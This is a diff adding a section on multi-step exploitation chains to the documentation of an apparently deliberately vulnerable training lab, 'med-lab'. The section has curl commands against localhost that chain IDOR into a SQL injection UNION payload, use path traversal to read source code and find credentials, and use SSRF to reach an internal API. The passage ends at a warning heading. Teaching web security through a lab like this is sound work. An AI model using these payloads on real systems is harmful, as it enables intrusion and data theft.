@@ -335,3 +335,36 @@ med-lab/
 4. **Expert**: Chain multiple vulnerabilities for complex exploits
 
 ### Multi-Step Exploitation Chains
+
+#### Chain 1: IDOR → SQLi
+```bash
+# 1. Use IDOR to access admin order
+curl -b cookies.txt http://localhost:4000/api/v1/orders/1
+
+# 2. Use SQLi in order lookup
+curl -b cookies.txt "http://localhost:4000/api/v1/orders/1%20UNION%20SELECT%20*%20FROM%20admin_secret--"
+```
+
+#### Chain 2: Path Traversal → Source Code Analysis → Privilege Escalation
+```bash
+# 1. Read source code via path traversal
+curl "http://localhost:4000/api/v1/download/invoice?file=....//....//app/src/routes/auth.js"
+
+# 2. Find hardcoded credentials
+# 3. Use credentials for admin access
+```
+
+#### Chain 3: SSRF → Internal Service Enumeration
+```bash
+# 1. Discover internal services
+curl "http://localhost:4000/api/v1/proxy?url=http://internal-api:5000"
+
+# 2. Access internal API
+curl "http://localhost:4000/api/v1/proxy?url=http://internal-api:5000/secret"
+```
+
+---
+
+## 🔐 Security Considerations
+
+### ⚠️ WARNING
